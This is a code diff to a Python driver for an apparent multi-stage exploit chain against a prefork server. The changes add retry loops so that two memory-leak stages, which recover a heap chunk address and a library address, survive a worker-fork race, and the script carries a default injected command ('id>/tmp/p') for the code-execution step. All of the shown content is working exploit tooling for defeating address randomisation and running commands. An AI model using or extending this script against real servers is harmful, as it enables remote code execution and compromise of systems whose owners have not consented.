@@ -46,6 +46,10 @@ def main() -> int:
     ap.add_argument("--stage1-len", type=int, required=True)
     ap.add_argument("--stage2-t", type=int, required=True)
     ap.add_argument("--stage2-v", type=int, default=16)
+    ap.add_argument("--retries", type=int, default=5,
+                    help="attempts per leak stage (stage 1 has a worker-fork "
+                         "race: R2 must be served by the same child R1 left "
+                         "stale; the upstream chain retries for this reason)")
     ap.add_argument("--command", default="id>/tmp/p")
     args = ap.parse_args()
 
@@ -72,10 +76,18 @@ def main() -> int:
                          verbose=False)
 
         # Each stage needs a fresh worker: rotate first exactly as the
-        # upstream chain does before stage 1.
-        ex.rotate()
-        chunk, n, forge = cal.calibrate_stage1(
-            mod, ex, {"stage1_n": args.stage1_n, "stage1_len": args.stage1_len})
+        # upstream chain does before stage 1. A miss is retried with a fresh
+        # worker: stage 1 depends on R2 being served by the child that R1
+        # aborted, and prefork can finish forking a replacement in between.
+        chunk = n = forge = 0
+        for attempt in range(1, max(1, args.retries) + 1):
+            ex.rotate()
+            chunk, n, forge = cal.calibrate_stage1(
+                mod, ex, {"stage1_n": args.stage1_n,
+                          "stage1_len": args.stage1_len})
+            if chunk:
+                break
+            print(f"[*] stage 1 attempt {attempt}/{args.retries} missed", flush=True)
         if not chunk:
             print("LEAK_STAGE1=0x0\nLEAK_STAGE2=0x0\nLEAK_RESULT=absent", flush=True)
             print("LEAK_JSON=" + json.dumps({
@@ -84,10 +96,15 @@ def main() -> int:
             }), flush=True)
             return 2
 
-        ex.rotate()
-        lib, t_index = cal.calibrate_stage2(
-            mod, ex, args.dtor_offset,
-            {"stage2_t": args.stage2_t, "stage2_v": args.stage2_v})
+        lib = t_index = 0
+        for attempt in range(1, max(1, args.retries) + 1):
+            ex.rotate()
+            lib, t_index = cal.calibrate_stage2(
+                mod, ex, args.dtor_offset,
+                {"stage2_t": args.stage2_t, "stage2_v": args.stage2_v})
+            if lib:
+                break
+            print(f"[*] stage 2 attempt {attempt}/{args.retries} missed", flush=True)
         result = "both" if lib else "partial"
         print(f"LEAK_STAGE1=0x{chunk:x}", flush=True)
         print(f"LEAK_STAGE2=0x{lib:x}" if lib else "LEAK_STAGE2=0x0", flush=True)
